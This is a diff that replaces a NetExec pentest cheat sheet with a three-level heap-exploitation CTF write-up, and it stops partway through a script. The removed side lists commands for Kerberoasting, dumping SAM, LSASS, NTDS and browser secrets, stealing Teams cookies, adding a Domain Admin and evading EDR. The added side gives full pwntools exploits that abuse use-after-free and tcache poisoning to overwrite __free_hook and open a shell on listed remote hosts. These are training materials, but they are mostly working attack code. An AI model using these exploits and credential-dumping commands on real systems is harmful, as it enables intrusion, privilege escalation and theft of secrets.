@@ -1,340 +1,886 @@
-# NetExec
+# Harsh Sankhala
 
-NetExec (a.k.a nxc) is a network service exploitation tool that helps automate assessing the security of *large* networks
+# **Heap Pwn**
 
-![Untitled](https://fzl-aws.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F68ca7968-174f-4df4-ab04-3d91b871155c%2F19f4e3f7-b83b-4304-8517-e85500a7ad64%2FUntitled.png?table=block&id=5bd1b66d-16fc-490e-9b9f-672233618e40&spaceId=68ca7968-174f-4df4-ab04-3d91b871155c&width=2000&userId=&cache=v2)
+### Level 1
 
-NetExec can exploit multiple protocols like :
-
-```bash
-protocols:
-  available protocols
-
-  {smb,ssh,ldap,ftp,wmi,winrm,rdp,vnc,mssql}
-    smb                 own stuff using SMB
-    ssh                 own stuff using SSH
-    ldap                own stuff using LDAP
-    ftp                 own stuff using FTP
-    wmi                 own stuff using WMI
-    winrm               own stuff using WINRM
-    rdp                 own stuff using RDP
-    vnc                 own stuff using VNC
-    mssql               own stuff using MSSQL
-```
-
-### Install
-
-```python
-apt install pipx git
-pipx ensurepath
-pipx install git+https://github.com/Pennyw0rth/NetExec
-```
-
-or use the static binaries from here
-
-![](https://github.com/Pennyw0rth/NetExec/releases/tag/v1.2.0)
-
-![Untitled](https://fzl-aws.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F68ca7968-174f-4df4-ab04-3d91b871155c%2F86c8554e-eb40-4661-bc63-d150dfce070c%2FUntitled.png?table=block&id=527a21a7-3826-4e57-b2d8-dc817aa4ea99&spaceId=68ca7968-174f-4df4-ab04-3d91b871155c&width=2000&userId=&cache=v2)
-
-## ASREP-Roasting
-
-- without password
-
-```python
-❯ nxc ldap 10.10.10.192 -u users.txt -p '' --asreproast output.txt
-```
-
-![Untitled](NetExec%208a934ca18e734569910cf461cf66d845/Untitled%202.png)
-
-- with password
-
-```python
-nxc ldap 192.168.0.104 -u harry -p pass --asreproast output.txt --kdcHost oscp.local
-```
-
-## Kerberoasting
-
-```python
-❯ nxc ldap 10.10.10.100 -u svc_tgs -p GPPstillStandingStrong2k18 --kerberoasting output.txt
-```
-
-![Untitled](NetExec%208a934ca18e734569910cf461cf66d845/Untitled%203.png)
-
-# **Dump gMSA**
-
-Extract gmsa credentials accounts
-
-Using the protocol LDAP you can extract the password of a gMSA account if you have the right.
-
-![Untitled](NetExec%208a934ca18e734569910cf461cf66d845/Untitled%204.png)
-
-```python
-$ nxc ldap <ip> -u <user> -p <pass> --gmsa
-```
-
-![Untitled](NetExec%208a934ca18e734569910cf461cf66d845/Untitled%205.png)
-
-# BloodHound Ingestor
-
-```python
-❯ nxc ldap <ip> -u user -p pass --bloodhound -ns <ns-ip> --collection All
-```
-
-![Untitled](NetExec%208a934ca18e734569910cf461cf66d845/Untitled%206.png)
-
-# **Defeating LAPS**
-
-**Using NetExec when LAPS installed on the domain**
-
-If LAPS is used inside the domain, is can be hard to use NetExec to execute a command on every
-
-computer on the domain.
-
-Therefore, a new core option has been added `--laps !` If you have compromised an accout that can read LAPS password you can use NetExec like this
-
-in this case , we can see our user can read Laps password.
-
-![Untitled](NetExec%208a934ca18e734569910cf461cf66d845/Untitled%207.png)
-
-now let’s use `nxc`  to do this attack
-
-```bash
-❯ nxc winrm <IP> -u username -p 'password' --laps
-```
-
-![Untitled](NetExec%208a934ca18e734569910cf461cf66d845/Untitled%208.png)
-
-okay that’s our LAPS password. 
-
-### Manual Way to Read Laps Password
-
-```bash
-Get-ADComputer DC01 -property 'ms-mcs-admpwd'
-```
-
-![Untitled](NetExec%208a934ca18e734569910cf461cf66d845/Untitled%209.png)
-
-now let’s try to connect as administrator with that password & see if it works or not
-
-```bash
-❯ evil-winrm -i timelapse.htb -S -u administrator -p 'q.p+T{80W7t4Er#jzl]OcI6O'
-```
-
-![Untitled](NetExec%208a934ca18e734569910cf461cf66d845/Untitled%2010.png)
-
-bingo!! it works :D 
-
-### Dumping All Files from SMB
-
-```python
-❯ nxc smb 10.10.10.10 -u 'user' -p 'pass' -M spider_plus -o DOWNLOAD_FLAG=True
-```
-
-# **Get and Put Files**
-
-## Send a File to the Remote Target
-
-Send a local file to the remote target
-
-```bash
-nxc smb 172.16.251.152 -u user -p pass --put-file /tmp/whoami.txt \\Windows\\Temp\\whoami.txt
-```
-
-## Get a File From the Remote Target
-
-Get a remote file on the remote target
-
-```bash
-nxc smb 172.16.251.152 -u user -p pass --get-file  \\Windows\\Temp\\whoami.txt /tmp/whoami.txt
-```
-
-## **Checking for Spooler & WebDav**
-
-Checking if the Spooler Service is Running
-
-```bash
-nxc smb <ip> -u 'user' -p 'pass' -M spooler
-```
-
-Checking if the WebDav Service is Running
-
-```bash
-nxc smb <ip> -u 'user' -p 'pass' -M webdav
-```
-
-# **Impersonate logged-on Users**
-
-Use Sessions from logged-on Users to execute arbitrary commands using `schtask_as` 
-
-> **You need at least local admin privilege on the remote target**
+> Remote : nc 207.154.239.148 1369
 > 
 
-The Module `schtask_as` can execute commands on behalf on other users which has sessions on the target
+![Untitled](Harsh%20Sankhala%20e00405b9c8f449b9a1e1b44e6f19df08/Untitled.png)
 
-Attack Vector :
+`source code`
 
-1. Enumerate logged-on users on your Target
+```c
+#include <stdio.h>
+#include <malloc.h>
+#include <stdlib.h>
+
+extern void * _IO_list_all;
+
+char menu[] = "You are using %d/100 chunk addresses.\n1. New\n2. Delete\n3. Edit \n4. View data\n5. Exit\n> ";
+int space = 0;
+char* arr[100];
+int arr_size[100];
+char arr_in_use[100];
+
+int menu_malloc(){
+    int idx;
+    unsigned long sz;
+    printf("which index?\n> ");
+    scanf("%d", &idx);
+    getchar();
+    printf("how big?\n> ");
+    scanf("%ld", &sz);
+    getchar();
+    if ((idx >= 0) && (idx < 100)){
+        arr[idx] = malloc(sz);
+	arr_size[idx] = sz;
+	arr_in_use[idx] = 1;
+	space++;
+    } else {
+	printf("Invalid request\n");
+	return 1;
+    }
+    //printf("first payload?\n> ");
+    //fgets(arr[idx], sz, stdin);
+    return 0;
+}
+
+int menu_free(){
+    int idx;
+    printf("which index?\n> ");
+    scanf("%d", &idx);
+    getchar();
+    if ((idx >= 0) && (idx < 100)){
+        free(arr[idx]);
+	arr_in_use[idx]=0;
+	space--;
+    } else {
+	printf("Invalid request\n");
+	return 1;
+    }
+    return 0;
+}
+
+int menu_edit(){
+    int idx;
+    printf("which index?\n> ");
+    scanf("%d", &idx);
+    getchar();
+    if ((idx >= 0) && (idx < 100)){
+	printf("New contents?\n> ");
+	fgets(arr[idx], arr_size[idx]-1, stdin);
+    } else {
+	printf("Invalid request\n");
+	return 1;
+    }
+    return 0;
+}
+
+int menu_view(){
+    int idx;
+    printf("which index?\n> ");
+    scanf("%d", &idx);
+    getchar();
+    if ((idx >= 0) && (idx < 100)){
+        puts(arr[idx]);
+    } else {
+	printf("Invalid request\n");
+	return 1;
+    }
+    return 0;
+}
+
+int main(){
+    int choice;
+    setvbuf(stdin, NULL, _IONBF, 1);
+    setvbuf(stdout, NULL, _IONBF, 1);
+    while (1) {
+        printf(menu, space);
+        scanf("%d", &choice);
+        getchar();
+
+        switch (choice)
+        {
+        case 1:
+            menu_malloc();
+            break;
+
+        case 2:
+            menu_free();
+            break;
+
+        case 3:
+            menu_edit();
+            break;
+
+        case 4:
+            menu_view();
+            break;
+
+        case 5:
+            exit(0);
+            break;
+
+        default:
+            break;
+        }
+    }
+    return 0;
+}
+```
 
 ```bash
-nxc smb <ip> -u <localAdmin> -p <password> --loggedon-users
+❯ nc 207.154.239.148 1369
+You are using 0/100 chunk addresses.
+1. New
+2. Delete
+3. Edit 
+4. View data
+5. Exit
+> 
 ```
 
-2. Execute commands on behalf of other users
+## Solution
+
+`exploit.py`
 
 ```bash
-nxc smb <ip> -u <localAdmin> -p <password> -M schtask_as -o USER=<logged-on-user> CMD=<cmd-command>
+#!/usr/bin/env python3
+
+from pwn import *
+
+context.terminal = ['tmux', 'splitw', '-h']
+binaryname = "./spaghetti"
+context.log_level = 'error'
+context.binary = elf = ELF(binaryname)
+
+if args.REMOTE:
+    p=remote("207.154.239.148", 1369)
+elif args.GDB:
+    p=gdb.debug(binaryname, gdbscript=gs)
+else:
+    p=process(binaryname)
+
+def malloc(ind, size):
+    global p
+    r1 = p.sendlineafter(b">", b"1")
+    r2 = p.sendlineafter(b">", str(ind).encode())
+    r3 = p.sendlineafter(b">", str(size).encode())
+    #r4 = p.sendlineafter(b">",payload)
+    return r1+r2+r3#+r4
+
+def free(ind):
+    global p
+    r1 = p.sendlineafter(b">", b"2")
+    r2 = p.sendlineafter(b">", str(ind).encode())
+    return r1+r2
+
+def edit(ind, payload):
+    global p
+    r1 = p.sendlineafter(b">", b"3")
+    r2 = p.sendlineafter(b">", str(ind).encode())
+    r3 = p.sendlineafter(b">",payload)
+    return r1+r2+r3
+
+def view(ind):
+    global p
+    r1 = p.sendlineafter(b">", b"4")
+    r2 = p.sendlineafter(b">", str(ind).encode())
+    r3 = p.recvuntil(b"You are using")
+    return r1+r2+r3
+
+def readLeak(resp):
+    rawleak = resp.split(b'which index?\n> ')[1].split(b'\n')[0]
+    paddedleak = rawleak.ljust(8, b'\x00')
+    leak = u64(paddedleak)
+    return leak
+
+libc = elf.libc
+context.log_level = 'info'
+
+malloc(2, 0x4f8)
+malloc(0, 0x18)
+malloc(1, 0x18)
+
+free(2)
+libc.address = readLeak(view(2)) - 0x1ecbe0
+info("libc base : " + hex(libc.address))
+
+free(1)
+free(0)
+
+# Now the tcache is as such: chunk 0 -> chunk 1
+# so we'll overwrite chunk 0's forward pointer to __free_hook
+
+edit(0, pack(libc.sym.__free_hook))
+malloc(3, 0x18)
+malloc(4, 0x18) # this will return __free_hook address
+
+edit(4, pack(libc.sym.system))
+edit(3, b'/bin/sh\x00')
+
+free(3)
+
+context.log_level = 'error'
+p.interactive(prompt='shell> ')
+p.close()
 ```
 
-![Untitled](NetExec%208a934ca18e734569910cf461cf66d845/Untitled%2011.png)
-
-Custom command to add an user to the domain admin group for easy copy & pasting:
-
-```powershell
-powershell.exe \"Invoke-Command -ComputerName DC01 -ScriptBlock {Add-ADGroupMember -Identity 'Domain Admins' -Members USER.NAME}\"
-```
-
-# **Steal Microsoft Teams Cookies**
-
-> **You need at least local admin privilege on the remote target**
+> **Don't forget to run it along with the libc and binary in the same folder exploit.py is in**
 > 
 
-New NetExec module to dump Microsoft Teams cookies. You can use them to retrieve information like users, messages, groups etc or send directly messages in Teams.
+![carbon.png](Harsh%20Sankhala%20e00405b9c8f449b9a1e1b44e6f19df08/carbon.png)
 
-```bash
-$ nxc smb <ip> -u user -p pass -M teams_localdb
-```
+**Flag :** `ninja{why_d03s_m1ch3lle_pf3iff3r_sh0w_up_1n_rap?}`
 
-# **Obtaining Credentials**
+## Vulnerability Detection
 
-**Dump SAM**
+1. **Vulnerability Type**: Use-After-Free (UAF)
+    - **Explanation**: UAF vulnerabilities occur when a program continues to use memory after it has been freed, which can lead to unpredictable behavior or allow an attacker to execute arbitrary code.
+2. **Vulnerable Functions**:
+    - **`menu_free`**: This function frees the memory pointed to by **`arr[idx]`** but does not set the pointer to **`NULL`**. Thus, the pointer remains in the **`arr`** array and points to a now-freed memory location. This dangling pointer can be exploited.
+    - **`menu_edit`**: This function allows writing data to **`arr[idx]`**, assuming it is still valid. If **`idx`** points to a previously freed chunk (due to a dangling pointer left by **`menu_free`**), **`menu_edit`** enables writing to this freed memory.
+    
 
-> You need at least local admin privilege on the remote target, use option **--local-auth** if your user is a local account
+## Approach Explanation
+
+Now the first thing you gotta try with this is overwriting heap metadata, 
+
+- here we're in libc 2.31 so the __malloc_hook and __free_hook  are prime targets
+so the idea would be overwriting some freed chunks' fd pointer in order to make malloc think that we can redistribute a chunk address at one of those hooks
+this would allow us to then use the edit() function to overwrite whatever we want to be called instead of malloc or free
+- so first we need a libc leak to find the address of those symbols and also to find the system() function in glibc
+To do this it's actually pretty easy, you can allocate a big chunk (i did size 0x4f8) and free it (but make sure to add some chunks for padding between the big chunk and the wilderness otherwise it'll get consolidated by malloc and the leak won't work).
+- This chunk will get linked inside of the unsorted bin and therefore will have an fd pointer to the main_arena which is a libc symbol so we'll be able to use the menu_read() to leak a libc pointer
+- one we have this we can setup 2 small chunks ( i did size 0x18) : A and B and free B then free A After this we have tcache [ 0x18 ] = chunk A -> chunk B
+now you can use edit() to edit chunk A's fd pointer and make it point to libc's __free_hook symbol instead because of this overwrite, if we now allocate a chunk C and a chunk D, chunk D will actually point to the __free_hook symbol
+- then we can use edit() to overwrite __free_hook with the address of libc's system function
+and free a chunk containing "/bin/sh\x00"
+- this will call system("/bin/sh") instead of free
+and pop a shell
+
+## Exploit Explanation
+
+1. **Heap Setup and Allocation**: The script first creates three heap chunks (**`malloc(2, 0x4f8)`**, **`malloc(0, 0x18)`**, **`malloc(1, 0x18)`**). The sizes are chosen carefully; the first one is large (0x4f8) to trigger specific behavior in the heap management, and the other two are small (0x18) which are commonly used for exploiting fastbins or tcache bins in the glibc memory allocator.
+2. **Free and Leak**: The large chunk (index 2) is freed (**`free(2)`**), and then its contents are viewed (**`view(2)`**). Because the chunk was freed, the content viewed is the heap metadata, specifically the address of the next free chunk in the memory. This leak helps in determining the libc base address as this leaked address (**`readLeak()`**) is part of libc's memory management data structures. The offset (**`0x1ecbe0`**) is subtracted to find the libc base address.
+3. **Free Small Chunks**: The script frees the two smaller chunks (**`free(1)`** and **`free(0)`**). This action places them in the tcache (thread cache), which is a mechanism to speed up allocations and frees by keeping a per-thread cache of recently freed chunks.
+4. **Corrupt Forward Pointer**: Using the **`edit`** function, the script corrupts the forward pointer of the chunk at index 0 to point to the **`__free_hook`** (**`edit(0, pack(libc.sym.__free_hook))`**). The **`__free_hook`** is a function pointer used by libc to manage free operations, and overwriting it can control what function gets called on subsequent **`free()`** calls.
+5. **Allocate Overwritten Chunks**: The script allocates two more chunks of the same size (**`malloc(3, 0x18)`** and **`malloc(4, 0x18)`**). Due to the previous corruption, the chunk returned at index 4 will actually be the **`__free_hook`**. This allows the attacker to overwrite the **`__free_hook`** with the address of the **`system`** function from libc (**`edit(4, pack(libc.sym.system))`**).
+6. **Trigger Arbitrary Code Execution**: The chunk at index 3 is overwritten with the string **`'/bin/sh\x00'`** (**`edit(3, b'/bin/sh\x00')`**). Since the **`__free_hook`** now points to **`system`**, when **`free(3)`** is called, it effectively invokes **`system("/bin/sh")`**, spawning a shell.
+7. **Gain Shell Access**: Finally, the script drops into an interactive mode (**`p.interactive()`**) where the attacker can interact with the spawned shell, effectively gaining control over the system under the context of the program's execution privileges.
+
+This exploitation technique showcases classic heap exploitation strategies, such as leaking libc addresses to bypass ASLR, corrupting forward pointers in the tcache, and ultimately hijacking the **`__free_hook`** to gain arbitrary code execution.
+
+# Level2
+
+> **Remote : nc 207.154.239.148 1370**
 > 
 
+![Untitled](Harsh%20Sankhala%20e00405b9c8f449b9a1e1b44e6f19df08/Untitled%201.png)
+
+**Source Code**
+
+`level2.c`
+
 ```bash
-nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
+#include <stdio.h>
+#include <malloc.h>
+#include <stdlib.h>
+
+extern void * _IO_list_all;
+
+char menu[] = "You are using %d/100 chunk addresses.\n1. New\n2. Delete\n3. Edit \n4. View data\n5. Exit\n> ";
+int space = 0;
+char* arr[100];
+int arr_size[100];
+char arr_in_use[100];
+
+int menu_malloc(){
+    int idx;
+    unsigned long sz;
+    printf("which index?\n> ");
+    scanf("%d", &idx);
+    getchar();
+    printf("how big?\n> ");
+    scanf("%ld", &sz);
+    getchar();
+    if ((idx >= 0) && (idx < 100)){
+        arr[idx] = malloc(sz);
+	arr_size[idx] = sz;
+	arr_in_use[idx] = 1;
+	space++;
+    } else {
+	printf("Invalid request\n");
+	return 1;
+    }
+    //printf("first payload?\n> ");
+    //fgets(arr[idx], sz, stdin);
+    return 0;
+}
+
+int menu_free(){
+    int idx;
+    printf("which index?\n> ");
+    scanf("%d", &idx);
+    getchar();
+    if ((idx >= 0) && (idx < 100)){
+        free(arr[idx]);
+	arr_in_use[idx]=0;
+	space--;
+    } else {
+	printf("Invalid request\n");
+	return 1;
+    }
+    return 0;
+}
+
+int menu_edit(){
+    int idx;
+    printf("which index?\n> ");
+    scanf("%d", &idx);
+    getchar();
+    if ((idx >= 0) && (idx < 100)){
+	printf("New contents?\n> ");
+	fgets(arr[idx], arr_size[idx]-1, stdin);
+    } else {
+	printf("Invalid request\n");
+	return 1;
+    }
+    return 0;
+}
+
+int menu_view(){
+    int idx;
+    printf("which index?\n> ");
+    scanf("%d", &idx);
+    getchar();
+    if ((idx >= 0) && (idx < 100)){
+        puts(arr[idx]);
+    } else {
+	printf("Invalid request\n");
+	return 1;
+    }
+    return 0;
+}
+
+int main(){
+    int choice;
+    setvbuf(stdin, NULL, _IONBF, 1);
+    setvbuf(stdout, NULL, _IONBF, 1);
+    while (1) {
+        printf(menu, space);
+        scanf("%d", &choice);
+        getchar();
+
+        switch (choice)
+        {
+        case 1:
+            menu_malloc();
+            break;
+
+        case 2:
+            menu_free();
+            break;
+
+        case 3:
+            menu_edit();
+            break;
+
+        case 4:
+            menu_view();
+            break;
+
+        case 5:
+            exit(0);
+            break;
+
+        default:
+            break;
+        }
+    }
+    return 0;
+}
 ```
 
-**Dump LSA**
+### **Exploit**
 
-> Requires Domain Admin or Local Admin Priviledges on target Domain Controller
+```bash
+#!/usr/bin/env python3
+
+from pwn import *
+
+binaryname = "./encrypted"
+context.binary = elf = ELF(binaryname)
+libc = elf.libc
+
+if args.REMOTE:
+    p=remote("207.154.239.148", 1370)
+elif args.GDB:
+    p=gdb.debug(binaryname, gdbscript=gs)
+else:
+    p=process(binaryname)
+
+def malloc(ind, size):
+    global p
+    r1 = p.sendlineafter(b">", b"1")
+    r2 = p.sendlineafter(b">", str(ind).encode())
+    r3 = p.sendlineafter(b">", str(size).encode())
+    #r4 = p.sendlineafter(b">",payload)
+    return r1+r2+r3#+r4
+
+def free(ind):
+    global p
+    r1 = p.sendlineafter(b">", b"2")
+    r2 = p.sendlineafter(b">", str(ind).encode())
+    return r1+r2
+
+def edit(ind, payload):
+    global p
+    r1 = p.sendlineafter(b">", b"3")
+    r2 = p.sendlineafter(b">", str(ind).encode())
+    r3 = p.sendlineafter(b">",payload)
+    return r1+r2+r3
+
+def view(ind):
+    global p
+    r1 = p.sendlineafter(b">", b"4")
+    r2 = p.sendlineafter(b">", str(ind).encode())
+    r3 = p.recvuntil(b"You are using")
+    return r1+r2+r3
+
+def readLeak(resp):
+    rawleak = resp.split(b'which index?\n> ')[1].split(b'\n')[0]
+    paddedleak = rawleak.ljust(8, b'\x00')
+    leak = u64(paddedleak)
+    return leak
+
+def encrypt(target, heapbase):
+    return target ^ (heapbase >> 12)
+
+A = 0
+B = 1
+C = 2
+
+malloc(C, 0x4f8)
+malloc(A, 0x30)
+malloc(B, 0x30)
+
+free(A)
+free(B)
+free(C)
+
+heapbase = readLeak(view(A)) << 4*3
+
+malloc(3, 0x500)
+
+libc.address = readLeak(view(C)) - 0x1e4030
+
+print(hex(heapbase))
+print(hex(libc.address))
+
+edit(B, p64(encrypt(libc.sym.__free_hook, heapbase)))
+
+malloc(B, 0x30)
+malloc(4, 0x30)  # free hook
+
+edit(B, b'/bin/sh\x00')
+edit(4, p64(libc.sym.system))
+
+free(B)
+
+p.interactive()
+p.close()
+```
+
+```bash
+$ python3 exploit.py REMOTE
+```
+
+![Untitled](Harsh%20Sankhala%20e00405b9c8f449b9a1e1b44e6f19df08/Untitled%202.png)
+
+# Level3
+
+> **Remote : nc 207.154.239.148 1371**
 > 
 
+`exploit.py`
+
 ```bash
-nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
+#!/usr/bin/env python3
+
+from pwn import *
+
+binaryname = "./free_a"
+context.binary = elf = ELF(binaryname)
+context.terminal = ['alacritty', '-e']
+libc = elf.libc
+
+gs = """
+b *main
+continue
+"""
+if args.REMOTE:
+    p=remote("207.154.239.148", 1371)
+elif args.GDB:
+    p=gdb.debug(binaryname, gdbscript=gs)
+else:
+    p=process(binaryname)
+
+def malloc(ind, size):
+    global p
+    r1 = p.sendlineafter(b">", b"1")
+    r2 = p.sendlineafter(b">", str(ind).encode())
+    r3 = p.sendlineafter(b">", str(size).encode())
+    #r4 = p.sendlineafter(b">",payload)
+    return r1+r2+r3#+r4
+
+def free(ind):
+    global p
+    r1 = p.sendlineafter(b">", b"2")
+    r2 = p.sendlineafter(b">", str(ind).encode())
+    return r1+r2
+
+def edit(ind, payload):
+    global p
+    r1 = p.sendlineafter(b">", b"3")
+    r2 = p.sendlineafter(b">", str(ind).encode())
+    r3 = p.sendlineafter(b">",payload)
+    return r1+r2+r3
+
+def view(ind):
+    global p
+    r1 = p.sendlineafter(b">", b"4")
+    r2 = p.sendlineafter(b">", str(ind).encode())
+    r3 = p.recvuntil(b"You are using")
+    return r1+r2+r3
+
+def readLeak(resp):
+    rawleak = resp.split(b'which index?\n> ')[1].split(b'\n')[0]
+    paddedleak = rawleak.ljust(8, b'\x00')
+    leak = u64(paddedleak)
+    return leak
+
+def encrypt(target, heapbase):
+    return target ^ (heapbase >> 12)
+
+malloc(0, 0x4f8)
+malloc(1, 0x68)
+
+free(1)
+malloc(1, 0x68)
+heapbase = readLeak(view(1)) << 12
+
+free(0)
+malloc(90, 0x500)
+malloc(0, 0x4f8)
+libc.address = readLeak(view(0)) - 0x1e4030
+free(90)
+
+info("libc address: " + hex(libc.address))
+info("heap base: " + hex(heapbase))
+info("__free_hook@GLIBC: " + hex(libc.sym.__free_hook))
+
+for i in range(7):
+    malloc(i, 0x108)
+
+malloc(7, 0x108)
+malloc(8, 0x108)
+malloc(9, 0x10) # padding to avoid top chunk consolidation
+
+for i in range(7):
+    free(i)
+
+free(8)
+free(7)
+
+malloc(10, 0x108) # free one spot in tcache
+
+free(8)
+malloc(11, 0x218)
+
+target = encrypt(libc.sym.__free_hook, heapbase + 0x1000)
+edit(11, b'A'*0x108 + pack(0x111) + pack(target))
+
+malloc(12, 0x108)
+malloc(13, 0x108) # this controls __free_hook
+edit(13, pack(libc.sym.system))
+edit(12, b'/bin/sh\x00')
+
+free(12) # system("/bin/sh")
+
+p.interactive()
+p.close()
 ```
 
-**Dump NTDS.dit**
-
-> Requires Domain Admin or Local Admin Priviledges on target Domain Controller
-> 
+![Untitled](Harsh%20Sankhala%20e00405b9c8f449b9a1e1b44e6f19df08/Untitled%203.png)
 
 ```bash
-nxc smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
-nxc smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds --users
-nxc smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds --users --enabled
-nxc smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
+ninja{st4ying_4t_th3_double_fr33_h0t3l}
 ```
 
-> You can also DCSYNC with the computer account of the DC
-> 
+# Happy Hacking : D
 
-There is also the ntdsutil module that will use ntdsutil to dump NTDS.dit and SYSTEM hive and parse them locally with [secretsdump.py](http://secretsdump.py/)
-
-```bash
-nxc smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' -M ntdsutil
-```
-
-**Dump LSASS**
-
-> You need at least local admin privilege on the remote target, use option **--local-auth** if your user is a local account
-> 
-
-Using `Lsassy` 
+All in One
 
 ```bash
-nxc smb 192.168.255.131 -u administrator -p pass -M lsassy
-```
+from pwn import *
 
-Using `nanodump` 
+def level1():
+    binaryname = "./spaghetti"
+    context.binary = elf = ELF(binaryname)
 
-```bash
-nxc smb 192.168.255.131 -u administrator -p pass -M nanodump
-```
+    p = remote("207.154.239.148", 1369)
 
-using `MimiKatz` 
+    def malloc(ind, size):
+        global p
+        r1 = p.sendlineafter(b">", b"1")
+        r2 = p.sendlineafter(b">", str(ind).encode())
+        r3 = p.sendlineafter(b">", str(size).encode())
+        return r1 + r2 + r3
 
-```bash
-nxc smb 192.168.255.131 -u administrator -p pass -M mimikatz
+    def free(ind):
+        global p
+        r1 = p.sendlineafter(b">", b"2")
+        r2 = p.sendlineafter(b">", str(ind).encode())
+        return r1 + r2
 
-nxc smb 192.168.255.131 -u Administrator -p pass -M mimikatz -o COMMAND='"lsadump::dcsync /domain:domain.local /user:krbtgt"
-```
+    def edit(ind, payload):
+        global p
+        r1 = p.sendlineafter(b">", b"3")
+        r2 = p.sendlineafter(b">", str(ind).encode())
+        r3 = p.sendlineafter(b">", payload)
+        return r1 + r2 + r3
 
-**Dump KeePass**
+    def view(ind):
+        global p
+        r1 = p.sendlineafter(b">", b"4")
+        r2 = p.sendlineafter(b">", str(ind).encode())
+        r3 = p.recvuntil(b"You are using")
+        return r1 + r2 + r3
 
-```bash
-$ NetExec smb <ip> -u user -p pass -M keepass_discover
-$ NetExec smb <ip> -u user -p pass -M keepass_trigger -o KEEPASS_CONFIG_PATH="path_from_module_discovery"
-```
+    def readLeak(resp):
+        rawleak = resp.split(b'which index?\n> ')[1].split(b'\n')[0]
+        paddedleak = rawleak.ljust(8, b'\x00')
+        leak = u64(paddedleak)
+        return leak
 
-**Dump DPAPI**
+    libc = elf.libc
 
-you can dump all secrets from Credential Manager, Chrome, Edge, Firefox
+    malloc(2, 0x4f8)
+    malloc(0, 0x18)
+    malloc(1, 0x18)
 
-> You need at least local admin privilege on the remote target, use option **--local-auth** if your user is a local account
-> 
-- cookies : Collect every cookies in browsers
-- nosystem : Won't collect system credentials. This will prevent EDR from stopping you from looting passwords 🔥
+    free(2)
+    libc.address = readLeak(view(2)) - 0x1ecbe0
+    print(f"libc base : {hex(libc.address)}")
 
-```bash
-$ nxc smb <ip> -u user -p password --dpapi
-$ nxc smb <ip> -u user -p password --dpapi cookies
-$ nxc smb <ip> -u user -p password --dpapi nosystem
-```
+    free(1)
+    free(0)
 
-**Dump WIFI password**
+    edit(0, pack(libc.sym.__free_hook))
+    malloc(3, 0x18)
+    malloc(4, 0x18)
 
-Get the WIFI password register in Windows
+    edit(4, pack(libc.sym.system))
+    edit(3, b'/bin/sh\x00')
 
-> You need at least local admin privilege on the remote target, use option **--local-auth** if your user is a local account
-> 
+    free(3)
 
-```bash
-nxc smb <ip> -u user -p pass -M wireless
-```
+    p.interactive(prompt='shell> ')
+    p.close()
 
-### **Extract gMSA Secrets**
+def level2():
+    binaryname = "./encrypted"
+    context.binary = elf = ELF(binaryname)
+    libc = elf.libc
 
-Convert gSAM id, convert gmsa lsa to ntlm 
-NetExec offer multiple choices when you found a gmsa account in the LSA
+    p = remote("207.154.239.148", 1370)
 
-```bash
-nxc ldap <ip> -u <user> -p <pass> --gmsa-convert-id 313e25a880eb773502f03ad5021f49c2eb5b5be2a09f9883ae0d83308dbfa724
+    def malloc(ind, size):
+        global p
+        r1 = p.sendlineafter(b">", b"1")
+        r2 = p.sendlineafter(b">", str(ind).encode())
+        r3 = p.sendlineafter(b">", str(size).encode())
+        return r1 + r2 + r3
 
-nxc ldap <ip> -u <user> -p <pass> --gmsa-decrypt-lsa '_SC_GMSA_{84A78B8C-56EE-465b-8496-FFB35A1B52A7}_313e25a880eb773502f03ad5021f49c2eb5b5be2a09f9883ae0d83308dbfa724:01000000240200001000120114021c02fbb096d10991bb88c3f54e153807b4c1cc009d30bc3c50fd6f72c99a1e79f27bd0cbd4df69fdf08b5cf6fa7928cf6924cf55bfd8dd505b1da26ddf5695f5333dd07d08673029b01082e548e31f1ad16c67db0116c6ab0f8d2a0f6f36ff30b160b7c78502d5df93232f72d6397b44571d1939a2d18bb9c28a5a48266f52737c934669e038e22d3ba5a7ae63a608f3074c520201f372d740fddec77a8fed4ddfc5b63ce7c4643b60a8c4c739e0d0c7078dd0c2fcbc2849e561ea2de1af7a004b462b1ff62ab4d3db5945a6227a58ed24461a634b85f939eeed392cf3fe9359f28f3daa8cb74edb9eef7dd38f44ed99fa7df5d10ea1545994012850980a7b3becba0000d22d957218fb7297b216e2d7272a4901f65c93ee0dbc4891d4eba49dda5354b0f2c359f185e6bb943da9bcfbd2abda591299cf166c28cb36907d1ba1a8956004b5e872ef851810689cec9578baae261b45d29d99aef743f3d9dcfbc5f89172c9761c706ea3ef16f4b553db628010e627dd42e3717208da1a2902636d63dabf1526597d94307c6b70a5acaf4bb2a1bdab05e38eb2594018e3ffac0245fcdb6afc5a36a5f98f5910491e85669f45d02e230cb633a4e64368205ac6fc3b0ba62d516283623670b723f906c2b3d40027791ab2ae97a8c5c135aae85da54a970e77fb46087d0e2233d062dcd88f866c12160313f9e6884b510840e90f4c5ee5a032d40000f0650a4489170000f0073a9188170000'
-```
+    def free(ind):
+        global p
+        r1 = p.sendlineafter(b">", b"2")
+        r2 = p.sendlineafter(b">", str(ind).encode())
+        return r1 + r2
 
-# **Scan for Vulnerabilities**
+    def edit(ind, payload):
+        global p
+        r1 = p.sendlineafter(b">", b"3")
+        r2 = p.sendlineafter(b">", str(ind).encode())
+        r3 = p.sendlineafter(b">", payload)
+        return r1 + r2 + r3
 
-When you start your internal pentest, these are the first modules you should try:
+    def view(ind):
+        global p
+        r1 = p.sendlineafter(b">", b"4")
+        r2 = p.sendlineafter(b">", str(ind).encode())
+        r3 = p.recvuntil(b"You are using")
+        return r1 + r2 + r3
 
-**ZeroLogon**
+    def readLeak(resp):
+        rawleak = resp.split(b'which index?\n> ')[1].split(b'\n')[0]
+        paddedleak = rawleak.ljust(8, b'\x00')
+        leak = u64(paddedleak)
+        return leak
 
-```bash
-nxc smb <ip> -u '' -p '' -M zerologon
-```
+    def encrypt(target, heapbase):
+        return target ^ (heapbase >> 12)
 
-**PetitPotam**
+    A = 0
+    B = 1
+    C = 2
 
-```bash
